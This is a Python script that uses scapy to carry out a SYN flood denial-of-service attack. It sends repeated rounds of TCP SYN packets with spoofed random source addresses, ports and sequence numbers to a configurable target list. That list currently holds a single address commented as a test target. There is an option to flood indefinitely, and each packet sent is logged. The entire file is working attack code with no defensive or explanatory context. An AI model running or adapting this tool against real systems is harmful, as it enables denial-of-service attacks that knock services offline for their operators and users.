import random
import argparse
import logging
from datetime import datetime
from scapy.all import IP, TCP, send

# --- Logging setup ---
log_filename = f"syn_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_port():
    return random.randint(1024, 65535)

targets_to_open_ports = {
    "10.10.10.10": [10]  # test target
}

def run_round(num_packets):
    target_ip = random.choice(list(targets_to_open_ports.keys()))
    target_port = random.choice(targets_to_open_ports[target_ip])

    for _ in range(num_packets):
        src_ip = generate_random_ip()
        src_port = generate_random_port()
        seq_num = random.randint(0, 4294967295)
        window = random.randint(1024, 65535)

        packet = IP(dst=target_ip, src=src_ip) / \
                 TCP(sport=src_port,
                     dport=target_port,
                     flags="S",
                     seq=seq_num,
                     window=window,
                     options=[('MSS', 1460)])
        try:
            send(packet, verbose=False)
            logger.info(
                f"SENT | src={src_ip}:{src_port} -> dst={target_ip}:{target_port} "
                f"seq={seq_num} win={window}"
            )
        except Exception as e:
            logger.error(f"ERROR sending packet: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="SYN flood with randomized TCP parameters.")
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-r", "--reps",
        type=int,
        default=10,
        help="Number of repetitions (default: 10)"
    )
    group.add_argument(
        "-i", "--infinite",
        action="store_true",
        help="Run forever until Ctrl+C"
    )
    parser.add_argument(
        "-n", "--num-packets",
        type=int,
        default=2000,
        help="Number of packets per round (default: 2000)"
    )
    return parser.parse_args()

def main():
    args = parse_args()

    logger.info(f"Logging packets to: {log_filename}")
    logger.info("Starting SYN flood with randomized TCP parameters...")
    logger.info("Press Ctrl+C to stop.")

    if args.infinite:
        logger.info("Mode: infinite")
        round_num = 0
        while True:
            round_num += 1
            logger.info(f"--- Round {round_num} ---")
            run_round(args.num_packets)
    else:
        logger.info(f"Mode: {args.reps} repetitions")
        for rep in range(1, args.reps + 1):
            logger.info(f"--- Round {rep}/{args.reps} ---")
            run_round(args.num_packets)

    logger.info("Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\nStopped by user.")